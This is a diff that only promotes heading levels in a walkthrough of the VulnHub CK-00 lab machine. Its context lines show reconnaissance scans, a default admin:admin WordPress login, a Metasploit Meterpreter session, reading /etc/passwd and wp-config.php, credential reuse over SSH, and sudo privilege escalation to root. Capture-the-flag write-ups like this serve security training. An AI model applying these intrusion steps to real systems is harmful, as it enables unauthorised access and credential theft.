@@ -4,9 +4,7 @@
 Available on VulnHub: https://www.vulnhub.com/entry/ck-00,444/
 
 
-## Walkthrough
-
-### IP Discovery
+## IP Discovery
 
 ```
 $ sudo netdiscover -r 192.168.1.0/16
@@ -29,7 +27,7 @@ xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
-### Port Scanning
+## Port Scanning
 
 ```
 $ nmap -AT4 -p- 192.168.1.142
@@ -56,7 +54,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 12.94 seconds
 ```
 
-### Web Analysis
+## Web Analysis
 
 ```
 $ nikto -h http://192.168.1.142
@@ -186,7 +184,7 @@ Update `/etc/hosts` with **ck** DNS
 
 WordPress Login Page: http://ck/wp-login.php
 
-### WordPress Analysis
+## WordPress Analysis
 
 ```
 $ wpscan --url http://192.168.1.142
@@ -303,12 +301,12 @@ Interesting Finding(s):
 User: **admin** \
 Listable Directory: http://192.168.1.142/wp-content/uploads/
 
-### WordPress Login
+## WordPress Login
 
 The default credentials were not changed.\
 WordPress Credentials: **admin** : **admin**
 
-### Exploitation
+## Exploitation
 
 ```
 $ msfconsole
@@ -375,7 +373,7 @@ OS          : Linux ck00 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC
 Meterpreter : php/linux
 ```
 
-### Machine Users
+## Machine Users
 
 ```
 www-data@ck00:/home/ck$ cat /etc/passwd | grep bash
@@ -392,7 +390,7 @@ Users:
 * bla1
 * bla
 
-### Flag #1
+## Flag #1
 
 ```
 meterpreter> shell
@@ -401,7 +399,7 @@ cat /home/ck/ck00-local-flag
 local.txt = 8163d4c2c7ccb38591d57b86c7414f8c
 ```
 
-### DataBase Info Acquiring
+## DataBase Info Acquiring
 
 ```
 meterpreter > cat /var/www/html/wp-config.php
@@ -503,7 +501,7 @@ DB_USER: **root** \
 DB_PASSWORD: **bla_is_my_password** \
 DB_HOST: **localhost**
 
-### DataBase Access
+## DataBase Access
 
 MySQL connection
 ```
@@ -572,7 +570,7 @@ mysql> SELECT user_login,user_pass FROM wp_users;
 
 Unfortunately, only the admin user is registered.
 
-### SSH Access
+## SSH Access
 
 Attempting SSH login with DB credentials.
 ```
@@ -590,7 +588,7 @@ uid=1002(bla) gid=1002(bla) groups=1002(bla)
 
 Credentials: **bla**:**bla_is_my_password**
 
-### Privilege Escalation to `bla1`
+## Privilege Escalation to `bla1`
 
 Attempt to login with `bla1` using `bla1_is_my_password`
 ```
@@ -604,7 +602,7 @@ uid=1001(bla1) gid=1001(bla1) groups=1001(bla1)
 
 Credentials: **bla1**:**bla1_is_my_password**
 
-### Privilege Escalation to `ck-00`
+## Privilege Escalation to `ck-00`
 
 Apparently `bla1` is allow to run `/bin/rbash` as `ck-00`.
 ```
@@ -626,7 +624,7 @@ ck-00@ck00:~$ id
 uid=1000(ck-00) gid=1000(ck-00) groups=1000(ck-00),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
 ```
 
-### Privilege Escalation to Root
+## Privilege Escalation to Root
 
 Apparently `ck-00` is allow to run `/bin/dd` as super user.
 ```
@@ -692,7 +690,7 @@ ck-00@ck00:~$ sudo su
 root@ck00:~#
 ```
 
-### Flag #2
+## Flag #2
 
 ```
 root@ck00:~# cat /root/ck00-root-flag.txt
